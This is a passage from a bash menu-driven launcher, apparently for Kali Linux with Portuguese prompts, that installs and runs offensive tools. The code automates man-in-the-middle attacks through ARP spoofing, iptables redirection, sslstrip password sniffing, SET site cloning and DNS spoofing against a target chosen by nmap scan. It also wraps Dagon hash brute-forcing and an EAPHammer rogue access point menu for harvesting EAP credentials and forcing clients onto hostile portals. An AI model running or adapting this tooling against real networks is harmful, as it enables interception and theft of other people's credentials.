		install_wifiautopwner
	elif [[ "$REIN" = "28" ]]
	then
		install_bully
	elif [[ "$REIN" = "29" ]]
	then
		install_anonsurf
	elif [[ "$REIN" = "30" ]]
	then
		install_anonym8
	elif [[ "$REIN" = "31" ]]
	then	
		install_thefatrat
	elif [[ "$REIN" = "32" ]]
	then
		install_angryip
	elif [[ "$REIN" = "33" ]]
	then
		install_sniper
	elif [[ "$REIN" = "34" ]]
	then
		install_recondog
	elif [[ "$REIN" = "35" ]]
	then
		install_redhawk
	elif [[ "$REIN" = "36" ]]
	then
		install_winpayloads
	elif [[ "$REIN" = "37" ]]
	then
		install_shellter
	elif [[ "$REIN" = "38" ]]
	then
		install_chaos
	elif [[ "$REIN" = "39" ]]
	then
		install_routersploit
	elif [[ "$REIN" = "40" ]]
	then
		install_geany
	elif [[ "$REIN" = "41" ]]
	then
		install_infoga
	elif [[ "$REIN" = "42" ]]
	then
		install_nwatch
	elif [[ "$REIN" = "43" ]]
	then
		install_eternalscanner
	elif [[ "$REIN" = "44" ]]
	then
		install_eaphammer
	elif [[ "$REIN" = "45" ]]
	then
		install_dagon
	elif [[ "$REIN" = "46" ]]
	then
		install_lalin
	elif [[ "$REIN" = "47" ]]
	then
		install_knockmail
	elif [[ "$REIN" = "48" ]]
	then
		install_kwetza
	elif [[ "$REIN" = "49" ]]
	then
		install_ngrok
	elif [[ "$REIN" = "50" ]]
	then
		install_bleachbit
	elif [[ "$REIN" = "51" ]]
	then
		install_vmr
	elif [[ "$REIN" = "52" ]]
	then
		install_hashbuster
	elif [[ "$REIN" = "53" ]]
	then
		install_findsploit
	elif [[ "$REIN" = "54" ]]
	then
		install_howdoi
	elif [[ "$REIN" = "55" ]]
	then
		install_operative
	elif [[ "$REIN" = "56" ]]
	then
		install_netattack2
	elif [[ "$REIN" = "57" ]]
	then
		install_koadic
	elif [[ "$REIN" = "58" ]]
	then
		install_empire
	elif [[ "$REIN" = "59" ]]
	then
		install_meterpreter_paranoid_mode
	elif [[ "$REIN" = "60" ]]
	then
		install_dropit_frmw
	elif [[ "$REIN" = "61" ]]
	then
		install_wifi_pumpkin
	elif [[ "$REIN" = "62" ]]
	then
		install_veil
	elif [[ "$REIN" = "63" ]]
	then
		install_leviathan
	elif [[ "$REIN" = "64" ]]
	then
		install_fake_image
	elif [[ "$REIN" = "65" ]]
	then
		install_avet
	elif [[ "$REIN" = "66" ]]
	then
		install_gloom
	elif [[ "$REIN" = "67" ]]
	then
		install_arcanus
	elif [[ "$REIN" = "68" ]]
	then
		install_msfpc
	elif [[ "$REIN" = "69" ]]
	then
		install_morphhta
	elif [[ "$REIN" = "70" ]]
	then
		install_lfi
	elif [[ "$REIN" = "71" ]]
	then
		install_unibyav
	elif [[ "$REIN" = "72" ]]
	then
		install_demiguise
	elif [[ "$REIN" = "73" ]]
	then
		install_dkmc
	elif [[ "$REIN" = "74" ]]
	then
		install_mitmf
	elif [[ "$REIN" = "back" || "$REIN" = "b" ]]
	then
		clear
		break
	elif [[ "$REIN" = "00" ]]
	then	
		exec bash "$0"
	elif [[ "$REIN" = "0" ]]
	then
		clear
		exit
	fi
	done
}
function errors_menu
{
TERMINALTITLE="ERRORS"
dash_calc
printf '\033]2;ERRORS\a'
echo -e ""$YS" 1"$CE") Fix no audio issue"
echo -e ""$YS" 2"$CE") No output in wash"
echo -e ""$YS" 3"$CE") No full screen"
echo -e ""$YS" 4"$CE") Error constructing proxy for org.gnome.Terminal"
echo -e ""$YS" 5"$CE") Error starting apache2 service"
echo -e ""$YS" 6"$CE") Errors when apt-get update"
echo -e ""$YS" 7"$CE") Errors when creating a payload with Winpayloads"
echo -e ""$YS" 8"$CE") Complete fix for apache2 service failed to start"
echo -e ""$YS" b"$CE") Go back"
echo -e ""$YS" 0"$CE") EXIT"
echo -e " Choose: "
read ERRS
if [[ "$ERRS" = "1" ]]
then
	clear
	echo -e "Tentando obter algum áudio ..."
	sleep 2
	clear
	echo -e "Pressione "$YS"y"$CE" se/quando solicitado"
	sleep 3
	clear
	echo -e "Instalando pulseaudio......."
	sleep 1
	apt-get pulseaudio
	echo -e "Ativando pulseaudio......."
	sleep 1
	systemctl --user enable pulseaudio && systemctl --user start pulseaudio
	clear
	echo -e "Feito!"
	sleep 1
	clear
	echo -e "Quero dizer... Tente ver se você possui áudio."
	sleep 3
	echo -e " "
	echo -e "Isso é tudo o que posso fazer :/"
	sleep 2
	echo -e " "
	echo -e "Se não foi corrigido, tente reiniciar"
elif [[ "$ERRS" = "2" ]]
then
	clear
	echo -e "Ok... Vamos tentar corrigir isso ..."
	sleep 1
	mkdir /etc/reaver
	echo -e "Parece que deu certo."
	echo -e "Digite sua interface"
	read INTWASH
	echo -e "Pressione "$YS"qualquer tecla"$CE" para testar o wash"
	echo -e "Tente também" wash -i wlan0mon -a" para exibir todas as redes"
	wash -i $INTWASH
elif [[ "$ERRS" = "3" ]]
then
	apt-get install -y open-vm-tools-desktop fuse
	echo -e "Reinicie sua máquina visual..."
	sleep 2
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "4" ]]
then
	locale-gen
	localectl set-locale LANG="en_US.UTF-8"
	sleep 2
	echo -e "Reinicie seu sistema agora"
	sleep 3
elif [[ "$ERRS" = "5" ]]
then
	service nginx stop
	echo -e "Eu acho que reparei isso. Tente novamente: service apache2 start "
	sleep 5
elif [[ "$ERRS" = "6" ]]
then
	echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
	rm -r -f /etc/apt/sources.list.d/*
	echo -e "Tente    apt-get update    again. Isso é tudo o que posso fazer."
	sleep 3
elif [[ "$ERRS" = "7" ]]
then
	rm -f -r /usr/local/lib/python2.7/dist-packages/Crypto
	echo -e "O erro foi corrigido!"
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "8" ]]
then
	apt-get -y remove nginx
	apt-get -y remove nginx-full
	apt-get -y remove nginx-common
	apt-get -y autoremove
	clear
	echo -e "O erro foi corrigido!"
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "back" || "$ERRS" = "b" ]]
then
	BACKL="1"
	break
elif [[ "$ERRS" = "0" ]]
then
	clear
	exit
elif [[ "$ERRS" = "00" ]]
then
	clear
	exec bash "$0"
else
	clear
	echo -e "Não é uma opção válida..."
	exec bash "$0"
fi
}
function keyboard_shortcuts
{
if [[ ! -d ""$KSPATH"" ]]
then
	mkdir "$KSPATH"
fi
while true
do
TERMINALTITLE="KEYBOARD SHORTCUTS"
dash_calc
printf '\033]2;KEYBOARD SHORTCUTS\a'
echo -e ""$YS" 1"$CE") Ferramentas"
echo -e ""$YS" 2"$CE") Ver atalhos ocultos"
echo -e ""$YS" b"$CE") Voltar"
#~ echo -e ""$YS"00"$CE") Main menu"
echo -e ""$YS" 0"$CE") Sair"
read KS
clear
if [[ "$KS" = "1" ]]
then
	while true
	do
		echo -e "Atalhos disponíveis:                        "$YS"reset"$CE") Deletar todos os atalhos"
		nn=1
		#start sorting out all the available shortcuts
		HOWADD=$(( HOWMANYTOOLS + 1 )) 
		while [ "$nn" != "$HOWADD" ]
		do
		listshortcuts
		#adding a space where needed on the output,so it will be sorted correctly
		if [[ "$nn" -lt "10" ]]
		then
			n=" $nn"
		else
			n="$nn"
		fi
		if [[ ! -f ""$KSPATH"/"$TITLE"/"$TITLE".txt" ]]
		then
			echo -e ""$YS""$n""$CE") "$TITLE""
		else
			read KSKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [[ "$KSKS" = "" ]]
			then
				KSKS="ERROR(fix=recreate the shortcut)"
			else
				read currentks < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
				size=${#TITLE}
				calc=$(( 35-size ))
				numcalc=1
				SPACES=""
				while [ $numcalc != $calc ]
				do
					SPACES=""$SPACES"_"
					numcalc=$(( numcalc+1 ))
				done
				#~ read SPACES < "$KSPATH"/spaces.txt
				echo -e ""$YS""$n""$CE") "$TITLE""$SPACES""$KSKS""
			fi
		fi
		nn=$(( nn+1 ))
		done
		echo -e ""$YS" b"$CE") Voltar"
		#echo -e ""$YS" 0"$CE") EXIT"
		echo -e "Escolha: "
		#nn=""
		read nn
		clear
		listshortcuts
		if [[ "$nn" = "" ]]
		then
			continue
		fi
		if [[ "$nn" = "back" || "$nn" = "b" ]]
		then
			clear
			break
		elif [[ "$nn" = "0" ]]
		then
			clear
			exit
		elif [[ "$nn" = "00" ]]
		then
			exec bash "$0"
		elif [[ "$nn" = "reset" ]]
		then
			rm -r "$KSPATH"/*
		elif [[ "$nn" -le "$HOWMANYTOOLS" ]]
		then
			createshortcut
		fi
		done
	elif [[ "$KS" = "2" ]]
	then
		hidden_shortcuts
	elif [[ "$KS" = "back" || "$KS" = "b" ]]
	then
		BACKL="1"
		clear
		break
	elif [[ "$KS" = "0" ]]
	then
		clear
		exit
	elif [[ "$KS" = "00" ]]
	then
		exec bash "$0"
	fi
done
}
function mitm_menu
{
clear
TERMINALTITLE="MITM"
dash_calc
printf '\033]2;MITM\a'
echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
echo -e ""$YS" b"$CE") Voltar"
echo -e ""$YS" 0"$CE") Sair"
read MITMATT
clear
if [[ "$MITMATT" = "1" ]]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Ativar ip_forward                 "$YS"d1"$CE") Desativar ip_forward "
	echo -e ""$YS" 2"$CE") Configurar iptables"
	echo -e ""$YS" 3"$CE") Escanear e selecionar um alvo IP         "$YS"33"$CE") Eu já escaneei"
	echo -e ""$YS" 4"$CE") Abrir o log do sslstrip"            # "$YS"44"$CE") Filter credentials"
	echo -e ""$YS" b"$CE") Voltar"
	echo -e ""$YS" 0"$CE") Sair"
	echo -e "Escolha: "
	read -e MITMCH
	if [[ "$MITMCH" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Pronto."
		sleep 1
	elif [[ "$MITMCH" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Pronto"
		sleep 1
	elif [[ "$MITMCH" = "2" ]]
	then
		clear
		echo -e "Redirecione a porta tcp 80 para a porta("$YS"Digite"$CE"=8080):"
		read PORTTCP
		if [[ "$PORTTCP" = "" ]]
		then
			PORTTCP="8080"
		fi
					clear
		echo -e "Redirecione a porta udp 40 para a porta("$YS"Digite"$CE"=40):"
		read PORTUDP
		if [[ "$PORTUDP" = "" ]]
		then
			PORTUDP="40"
		fi
		iptables --flush
		iptables --flush -t nat
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
		echo -e "Pronto."
		sleep 1
	elif [[ "$MITMCH" = "3" ]]
	then
		clear
		route -n
		echo -e ""
		echo -e ""
		echo -e "Digite seu gateway(prefira "$ETH" gateway):"
		read GATENM
		echo -e ""
		echo -e "Digite a interface do gateway("$YS"Digite"$CE"="$ETH"):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="$ETH"
		fi	
		while true
		do	
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Digite o IP do alvo"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/
		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "33" ]]
	then
		clear
		echo -e "Digite seu gateway(prefira "$ETH" gateway):"
		read GATENM
		echo -e ""
		echo -e "Digite a interface do gateway("$YS"Enter"$CE"="$ETH"):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="$ETH"
		fi
		clear
		echo -e "Digite o IP do alvo("$YS"r"$CE"=rescan):"
		read TARGIP
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/
		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "4" ]]
	then
		leafpad /root/sslstrip.log
	#~ elif [[ "$MITMCH" = "44" ]]
	#~ then
	elif [[ "$MITMCH" = "back" || "$MITMCH" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMCH" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMCH" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "2" ]]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Ativar ip_forward                 "$YS"d1"$CE") Disable ip_forward"
	echo -e ""$YS" 2"$CE") Escanear e selecionar o IP do alvo         "$YS"22"$CE") Eu já escaneei"
	echo -e ""$YS" 3"$CE") Ativar ARPspoofing"
	#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
	echo -e ""$YS" 4"$CE") Ativar SEToolkit"
	echo -e ""$YS" 5"$CE") Ativar DNSspoofing"
	echo -e ""$YS" b"$CE") Voltar"
	echo -e ""$YS" 0"$CE") Sair"
	echo -e "Escolha: "
	read -e MITMSET
	clear
	if [[ "$MITMSET" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Pronto."
		sleep 1
	elif [[ "$MITMSET" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Pronto."
		sleep 1
	elif [[ "$MITMSET" = "2" ]]
	then
		route -n
		echo -e ""
		echo -e ""
		echo -e "Digite seu gateway:"
		read GATENM
		echo -e ""
		echo -e "Digite a interface do gateway (por exemplo: wlan0):"
		read GATEINT
		while true
		do		
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Digite o IP do alvo("$YS"r"$CE"=re-escanear):"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
	elif [[ "$MITMSET" = "22" ]]
	then
		echo -e "Digite seu gateway:"
		read GATENM
		echo -e ""
		echo -e "Digite a interface do gateway (por exemplo: wlan0):"
		read GATEINT
		clear
		echo -e "Digite o IP do alvo:"
		read TARGIP
	elif [[ "$MITMSET" = "3" ]]
	then
		export PAKTC
		export GATEINT
		export TARGIP
		export GATENM
		cd "$LPATH"/
		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
	#~ elif [[ "$MITMSET" = "4" ]]
	#~ then
		#~ service apache2 start
	#~ elif [[ "$MITMSET" = "d4" ]]
	#~ then
		#~ service apache2 stop
	elif [[ "$MITMSET" = "4" ]]
	then
		echo -e "Clone um site para um dos seguintes IP (s)):"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		echo -e "$PAKTC"
		$READAK
		gnome-terminal --geometry 66x40+999999+0 -e setoolkit
	elif [[ "$MITMSET" = "5" ]]
	then
		echo -e "Faça você um arquivo hosts.txt"
		echo -e ""
		echo -e "Digite seu endereço IP que você iniciou o servidor:"
		echo -e "One of this/these:"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		read -e SERVIP
		echo -e "Digite a interface desse IP (por exemplo: wlan0):"
		read -e INTIP
		if [[ -f ""$LPATH"/HOSTS/hosts.txt" ]]
		then
			rm "$LPATH"/HOSTS/hosts.txt
		fi
		mkdir "$LPATH"/HOSTS
		clear
		while true
		do
		clear
		echo -e "Digite o URL do qual você deseja redirecionar seu IP (por exemplo: this is.myfakesite.com):"
		read -e URL
		echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
		sleep 0.2
		clear
		echo -e "Adicionar outro também?"$YNYES""
		read -e ANOTHERHOST
		if [[ "$ANOTHERHOST" = "n" ]]
		then
			break
		fi
		done
		clear
		echo -e "Ativando dnsspoof..."
		echo -e "$PAKTC"
		$READAK
		export INTIP
		xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
	elif [[ "$MITMSET" = "back" || "$MITMSET" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMSET" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMSET" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "back" || "$MITMATT" = "b" ]]
then
	BACKL="1"
	break
elif [[ "$MITMATT" = "00" ]]
then			
	clear
	exec bash "$0"
elif [[ "$MITMATT" = "0" ]]
then
	clear
	exit
fi
}
function dagon_script
{
while true
do
	clear
	TERMINALTITLE="DAGON"
	dash_calc
	printf '\033]2;DAGON\a'
	if [[ "$HASH" = "" || "$HASH" = "\e[1;31mNONE\e[0m" ]]
	then
		HASH="\e[1;31mNONE\e[0m"
		OK=0
	fi
	if [[ "$CORV" = "" ]]
	then
		CORV="crack"
	fi
	echo -e "-----------------Opções Básicas-----------------"
	echo -e ""$YS" 1"$CE") Especifique seu hash(es)        CURRENT:$HASH"
	echo -e ""$YS" 2"$CE") Crack/verify                 CURRENT:$CORV"
	if [[ -f /root/brscript/hashlog.txt ]]
	then
		echo -e ""$YS" 3"$CE") View your last log"
	else
		echo -e ""$RS" 3"$CE") View your last log"
	fi
	echo -e "--------------------Optional--------------------"
	if [[ "$DICTATTACK" = "" ]]
	then
		DICTATTACK="OFF"
	fi
	echo -e ""$YS" 4"$CE") Dictionary attack            CURRENT:$DICTATTACK"
	if [[ "$DICT" = "" && $DICTATTACK = "OFF" ]]
	then
		DICT="OFF"
	elif [[ "$DICT" = "\e[1;31mNONE\e[0m" && $DICTATTACK = "OFF" ]]
	then
		DICT="OFF"
	elif [[ "$DICT" = "OFF" && $DICTATTACK = "ON" ]]
	then
		DICT="\e[1;31mNONE\e[0m"
	elif [[ "$DICT" = "" && $DICTATTACK = "ON" ]]
	then
		DICT="\e[1;31mNONE\e[0m"
	fi
	if [[ "$DICTTYPE" = 1 ]]
	then
		DICT="$DICTPATH"
	elif [[ "$DICTTYPE" = 2 ]]
	then
		DICT="multiple"
	elif [[ "$DICTTYPE" = 3 ]]
	then
		DICT="$DICTPATH folder"
	fi
	echo -e "   "$YS"5"$CE") Specify dictionary/ies     CURRENT:$DICT"
	echo -e "------------------------------------------------"
	echo -e ""$YS" b"$CE") Go back              "$YS"update"$CE") Update dagon"
	echo -e ""$YS"start"$CE") Start"
	echo -e "Choose: "
	read DAGON
	clear
	if [[ "$DAGON" = "back" || "$DAGON" = "b" ]]
	then
		break
	elif [[ "$DAGON" = "4" ]]
	then
		if [[ "$DICTATTACK" = "OFF" ]]
		then
			DICTATTACK="ON"
		else
			DICTATTACK="OFF"
		fi
	elif [[ "$DAGON" = "update" ]]
	then
		cd /root/dagon
		python dagon.py --update
		sleep 3
	elif [[ "$DAGON" = "start" ]]
	then
		if [[ "$HASH" = "" || "$HASH" = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"No hash selected."$CE""
			sleep 3
		fi
		if [[ "$DICTATTACK" = "ON" && $DICT = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"No dictionary selected, but dictionary option is enabled"$CE""
			sleep 5
			continue
		fi
		cd /root/dagon
		if [[ "$HASHTYPE" = 1 ]]
		then
			if [[ "$CORV" = "crack" ]]
			then
				HASHCOMMAND="python dagon.py -c "$HASH" --bruteforce"
			else
				HASHCOMMAND="python dagon.py -v "$HASH""
			fi
		elif [[ "$HASHTYPE" = 2 || "$HASHTYPE" = 3 ]]
		then
			if [[ "$CORV" = "crack" ]]
			then
				HASHCOMMAND="python dagon.py -l "$HASH" --bruteforce"
			else
				HASHCOMMAND="python dagon.py -V "$HASH""
			fi
		fi
		if [[ "$DICTATTACK" = "ON" ]]
		then
			if [[ "$DICTTYPE" = 1 ]]
			then
				DICTCOMMAND="-w $DICTPATH"
			elif [[ "$DICTTYPE" = 2 ]]
			then
				DICTCOMMAND="-W $DICTPATH"
			elif [[ "$DICTTYPE" = 3 ]]
			then
				DICTCOMMAND="-D $DICTPATH"	
			fi
		else
			DICTCOMMAND=""
		fi	
		
	$HASHCOMMAND $DICTCOMMAND | tee "$LPATH/hashlog.txt"
	echo -e "$PAKTGB"
	$READAK
	elif [[ "$DAGON" = 5 ]]
	then
		echo -e ""$YS" 1"$CE") Select one disctionary"
		echo -e ""$YS" 2"$CE") Select multiple disctionaries"
		echo -e ""$YS" 3"$CE") Select a folder with disctionaries"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read DICTSEL
		clear
		if [[ "$DICTSEL" = 1 ]]
		then
			echo -e "Type the path of the dictionary:"
			read DICTPATH
			if [[ ! -f "$DICTPATH" ]]
			then
				echo -e ""$RS"No such file"$CE""
				sleep 2
				continue
			fi
			DICTTYPE=1
		elif [[ "$DICTSEL" = 2 ]]
		then
			echo -e "Type the path of the first dictionary:"
			read DICTPATH
			if [[ ! -f "$DICTPATH" ]]
			then
				echo -e ""$RS"No such file"$CE""
				sleep 2
				continue
			fi
			while true
			do
				clear
				echo -e ""$RS"----------TO STOP, TYPE 0----------"
				echo -e "Type the path of the next dictionary: "
				read DICTNEXT
				if [[ "$DICTNEXT" = "0" || "$DICTNEXT" = "o" || "$DICTNEXT" = "O" ]]
				then
					DICTTYPE=2
					break
				fi
			if [[ ! -f "$DICTNEXT" ]]
			then
				echo -e ""$RS"No such file"$CE""
				sleep 2
				continue
			fi
				DICTPATH=""$DICTPATH","$DICTNEXT""
			done
		elif [[ "$DICTSEL" = 3 ]]
		then
			echo -e "Type the path of the folder:"
			read DICTPATH
			if [[ ! -d "$DICTPATH" ]]
			then
				echo -e ""$RS"No such folder"$CE""
				sleep 2
				continue
			fi
			DICTTYPE=3
		elif [[ "$DICTSEL" = "back" || "$DICTSEL" = "b" ]]
		then
			continue
		fi
	elif [[ "$DAGON" = 3 ]]
	then
		if [[ ! -f /root/brscript/hashlog.txt ]]
		then
			echo -e ""$RS"No log found."$CE""
			sleep 2
		else
			cat /root/brscript/hashlog.txt
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [[ "$DAGON" = 1 ]]
	then
		clear
		echo -e ""$YS" 1"$CE") Type a hash"
		echo -e ""$YS" 2"$CE") Type multiple hashes"
		echo -e ""$YS" 3"$CE") Select a file with hashes"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read HASHES
		clear
		if [[ "$HASHES" = "back" || "$HASHES" = "b" ]]
		then
			continue
		elif [[ "$HASHES" = 1 ]]
		then
			echo -e "Type your hash: "
			read HASH
			HASHTYPE=1
		elif [[ "$HASHES" = 2 ]]
		then
			echo -e "Type your first hash: "
			read HASH
			echo -e "$HASH" > $LPATH/hashes.txt
			while true
			do
				clear
				echo -e ""$RS"----------TO STOP, TYPE 0----------"
				echo -e "Type your next hash: "
				read HASH
				if [[ "$HASH" = "0" || "$HASH" = "o" || "$HASH" = "O" ]]
				then
					HASH="multiple"
					break
				fi
				echo -e "$HASH" >> $LPATH/hashes.txt
			done
			HASHTYPE=2
		elif [[ "$HASHES" = 3 ]]
		then
			echo -e "Type the full path of the file: "
			read HASHPATH
			if [[ ! -f "$HASHPATH" ]]
			then
				echo -e ""$RS"There is not such file."$CE""
				sleep 3
			else
				HASH="$HASHPATH"
			fi
			HASHTYPE=3
		fi
	elif [[ "$DAGON" = 00 ]]
	then
		exec bash $0
	elif [[ "$DAGON" = 0 ]]
	then
		clear
		exit
	elif [[ "$DAGON" = 2 ]]
	then
		if [[ "$CORV" = "crack" ]]
		then
			CORV="verify"
		else
			CORV="crack"
		fi
	fi
done
}
function eaphammer_automation
{
			while true
			do
				clear
				TERMINALTITLE="EAPHAMMER"
				dash_calc
				printf '\033]2;EAPHAMMER\a'
				if [[ "$EAPHIFACE" = "" ]]
				then
					EAPHIFACE="$WLANN"
				fi
				if [[ "$EAPHESSID" = "" ]]
				then
					EAPHESSID=""$RS"NONE"$CE""
					OK1=0
				elif [[ "$EAPHESSID" != "\e[1;31mNONE\e[0m" ]]
				then
					OK1=1
				fi
				if [[ "$EAPHBSSID" = "" ]]
				then
					EAPHBSSID=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHCHANNEL" = "" ]]
				then
					EAPHCHANNEL=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHWPA" = "" ]]
				then
					EAPHWPA="2"
				fi
				if [[ "$EAPHAUTH" = "" ]]
				then
					EAPHAUTH=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHCREDS" = "" ]]
				then
					EAPHCREDS="OFF"
				fi
				if [[ "$EAPHHOSTILE" = "" ]]
				then
					EAPHHOSTILE="OFF"
				fi
				if [[ "$EAPHCAPTIVE" = "" ]]
				then
					EAPHCAPTIVE="OFF"
				fi
				if [[ "$EAPHPIVOT" = "" ]]
				then
					EAPHPIVOT="OFF"
				fi
				if [[ "$EAPHKARMA" = "" ]]
				then
					EAPHKARMA="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "" ]]
				then
					EAPHAIRCRACK="OFF"
				fi
				if [[ "$EAPHINTAUTO" = "" ]]
				then
					EAPHINTAUTO="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "OFF" && "$EAPHINTAUTO" = "OFF" && "$EAPHWORD" = "" ]]
				then
					EAPHWORD="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "OFF" && "$EAPHINTAUTO" = "OFF" && "$EAPHWORD" = "OFF" ]]
				then
					EAPHWORD="OFF"
				fi
				OK2=1
				if [[ "$EAPHAIRCRACK" != "OFF" ]]
				then
					if [[ "$EAPHWORD" = "OFF" || "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="\e[1;31mNONE\e[0m"
						OK2=0
					fi
				fi
				if [[ "$EAPHINTAUTO" = "ON" || "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
				then
					if [[ "$EAPHWORD" = "OFF" ]]
					then
						EAPHWORD="\e[1;31mNONE\e[0m"
						OK2=0
					fi
				fi
				if [[ "$EAPHINTAUTO" = "OFF" && "$EAPHAIRCRACK" = "OFF" ]]
				then
					if [[ "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="OFF"
					fi
				fi
				echo -e ""$YS" 1"$CE") Crie um novo cert RADIUS para o seu AP"
				echo -e ""$YS" 2"$CE") Defina sua interface para o AP                        CURRENT: $EAPHIFACE"
				echo -e ""$YS" 3"$CE") Especifique o ponto de acesso ESSID                   CURRENT: $EAPHESSID"
				echo -e ""$YS" 4"$CE") Especificar ponto de acesso BSSID                     CURRENT: $EAPHBSSID"
				echo -e ""$YS" 5"$CE") Especificar o canal do ponto de acesso                CURRENT: $EAPHCHANNEL"
				echo -e ""$YS" 6"$CE") Especifique o tipo WPA                                CURRENT: $EAPHWPA"
				echo -e ""$YS" 7"$CE") Especifique o tipo de autenticação                    CURRENT: $EAPHAUTH"
				echo -e ""$YS" 8"$CE") Receba os credores do EAP                             CURRENT: $EAPHCREDS"
				echo -e ""$YS" 9"$CE") Forçar clientes a se conectar ao portal hostil        CURRENT: $EAPHHOSTILE"
				echo -e ""$YS"10"$CE") Forçar clientes a se conectar ao portal cativo        CURRENT: $EAPHCAPTIVE"
				echo -e ""$YS"11"$CE") Execute um pivô indireto indireto                     CURRENT: $EAPHPIVOT"
				echo -e ""$YS"12"$CE") Ativar karma                                          CURRENT: $EAPHKARMA"
				echo -e ""$YS"13"$CE") Use autocrack/add com equipamento de cracking remoto  CURRENT: $EAPHAIRCRACK"
				echo -e ""$YS"14"$CE") Usar autocrack interno                                CURRENT: $EAPHINTAUTO"
				echo -e ""$YS"15"$CE") Especifique a lista de palavras para autocrack        CURRENT: $EAPHWORD"
				echo -e ""$YS"start"$CE") Iniciar "
				echo -e ""$YS"00"$CE") Menu principal"
				echo -e ""$YS" back"$CE") Voltar"
				echo -e "Escolha: "
				read EAPH
				clear
				if [[ "$EAPH" = 1 ]]
				then
					cd /root/eaphammer
					./eaphammer --cert-wizard
				elif [[ "$EAPH" = 2 ]]
				then
					echo -e "Digite a interface que deseja usar: "
					read EAPHIFACE
				elif [[ "$EAPH" = 3 ]]
				then
					echo -e "Digite o ESSID: "
					read EAPHESSID
				elif [[ "$EAPH" = 4 ]]
				then
					echo -e "Digite o BSSID: "
					read EAPHBSSID
				elif [[ "$EAPH" = 5 ]]
				then
					echo -e "Digite o canal: "
					read EAPHCHANNEL
				elif [[ "$EAPH" = 6 ]]
				then
					if [[ "$EAPHWPA" = 1 ]]
					then
						EAPHWPA=2
					else
						EAPHWPA=1
					fi
				elif [[ "$EAPH" = 7 ]]
				then
					echo -e ""$YS" 1"$CE") Open"
					echo -e ""$YS" 2"$CE") ttls"
					echo -e ""$YS" 3"$CE") peap"
					echo -e "Escolha: "
					read PAUTH
					if [[ "$PAUTH" = 1 ]]
					then
						EAPHAUTH="open"
					elif [[ "$PAUTH" = 2 ]]
					then
						EAPHAUTH="ttls"
